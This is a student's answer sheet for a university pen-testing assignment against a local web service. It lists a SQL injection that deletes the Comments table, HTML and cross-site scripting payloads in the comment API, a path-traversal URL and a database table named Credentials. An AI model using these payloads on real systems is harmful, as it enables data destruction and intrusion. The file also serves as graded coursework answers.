@@ -1,0 +1,70 @@
+Compsci 335 A3
+Name: Kyomin Ku
+UPI: kku031
+AUID: 5521999
+
+Pen-Testing the Service
+=======================
+Network User
+------------
+N01:	64
+
+N02: 	75
+
+N03: 	SQL injection is possible in the booksearch API or brsearch API, 
+		Service at http://localhost:8188/Service.svc/booksearch?term={TERM} or http://localhost:8188/Service.svc/brsearch?term={TERM}.
+		
+		http://localhost:8188/Service.svc/booksearch?term=';DELETE%20FROM%20Comments;
+
+N04:	HTML injection is possible in the comment API, Service at http://localhost:8188/Service.svc/comment?name={NAME}.
+		
+		POST http://localhost:8188/Service.svc/comment?name="<u>hello</u> HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+		Content-Length: 10
+
+		"Feedback"
+
+N05: 	POST http://localhost:8188/Service.svc/comment?name=<img%20src="http://localhost:8188/Service.svc/logo"%20alt="logo"%20style="width:100%"> HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+		Content-Length: 10
+
+		"Feedback"
+
+N06: 	Cross-site scripting (XSS) is possible in the comment API, Service at http://localhost:8188/Service.svc/comment?name={NAME}.
+		
+		POST http://localhost:8188/Service.svc/comment?name=<h%20onmouseover='alert("Hacked")%20'>Hacked!</h>" HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+		Content-Length: 10
+
+		"Feedback"
+
+
+Co-Located User 
+---------------
+C01: 	SQLite format 3
+
+C02: 	4 Tables: 
+		- Blurays
+		- Books
+		- Comments
+		- Credentials
+
+C03: 	user453
+
+C04: 	difficulty
+
+C05: 	http://localhost:8188/Service.svc/brimg?id=../BluraysBig/DearJohn
+
+C06: 	The CSRF attack could be mounted on the service by embeding a malicious link (which directs to another malicious website) on a victim's reproducible link.
+
+C07:	POST http://localhost:8188/Service.svc/comment?name=<button%20onclick="window.open("http://www.youtube.com")">Youtube</button> HTTP/1.1
+		Host: localhost
+		Content-Type: application/json
+		Content-Length: 10
+
+		"Feedback"
+	
+
